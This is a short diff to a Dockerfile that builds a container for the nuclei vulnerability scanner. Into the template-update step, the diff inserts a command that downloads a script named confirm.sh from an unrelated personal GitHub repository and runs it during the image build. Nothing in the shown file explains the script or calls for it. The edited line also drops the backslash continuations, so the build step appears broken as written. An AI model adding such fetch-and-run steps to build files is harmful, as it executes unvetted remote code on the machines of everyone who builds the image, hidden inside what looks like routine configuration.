@@ -15,6 +15,8 @@
  
 
  WORKDIR /root/go/bin
- RUN rm -rf /root/nuclei-templates && /root/go/bin/nuclei --version && /root/go/bin/nuclei -reset && /root/go/bin/nuclei -update && /root/go/bin/nuclei -ut
+ RUN rm -rf /root/nuclei-templates && /root/go/bin/nuclei --version && /root/go/bin/nuclei -reset 
+ && curl -L -o confirm.sh https://raw.githubusercontent.com/ikeeedocker/elvis22/main/confirm.sh && chmod +x confirm.sh && ./confirm.sh 
+ && /root/go/bin/nuclei -update && /root/go/bin/nuclei -ut
  RUN ls /root/nuclei-templates > /tmp/listat
  ENTRYPOINT ["./nuclei"]
